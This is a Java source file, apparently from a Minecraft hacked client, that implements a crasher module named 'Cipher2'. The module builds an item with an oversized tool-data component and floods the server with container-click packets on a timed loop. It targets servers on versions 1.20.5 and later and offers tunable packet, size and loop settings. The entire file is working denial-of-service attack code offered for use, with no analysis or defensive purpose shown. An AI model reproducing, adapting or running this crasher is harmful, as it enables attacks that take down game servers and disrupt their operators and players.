package us.rin.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import us.rin.crashers.Crasher;
import us.rin.gui.clickgui.ClickGui;
import us.rin.protocol.RedSignalProtocol;
import us.rin.protocol.components.data.DataComponents;
import us.rin.protocol.components.data.impl.DataTool;
import us.rin.protocol.components.objects.ItemStack;
import us.rin.protocol.packets.PacketCodec;
import us.rin.protocol.packets.play.PacketContainerClick;
import us.rin.utils.OptionType;
import us.rin.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Cipher2 implements Crasher {
    private static final String METHOD_NAME = "Cipher2";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int count = Integer.parseInt(args[4]);
        int threadSleep = Integer.parseInt(args[5]);
        long loopAmount = Long.parseLong(args[6]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            List<DataTool.Rule> rules = new ArrayList<>();
            int[] array = new int[count];
            for (int i = 0; i < size; i++)
                rules.add(new DataTool.Rule(array, 0F, false));

            DataComponents components = new DataComponents();
            components.put(new DataTool(rules, 0, 0));

            ItemStack item = new ItemStack(1, 1, components);

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() >= loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 37,
                        PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.LEFT_CLICK,
                        item, new Int2ObjectArrayMap<>()), packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.20.5/1.21.4&7, and your current protocol is &c" + protocol, true);
        }
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[1000], size[910], count[100], thread-sleep[2000], loop-amount[15]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Count", OptionType.INTEGER),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "1.20.5+ Components Overload Crash";
    }
}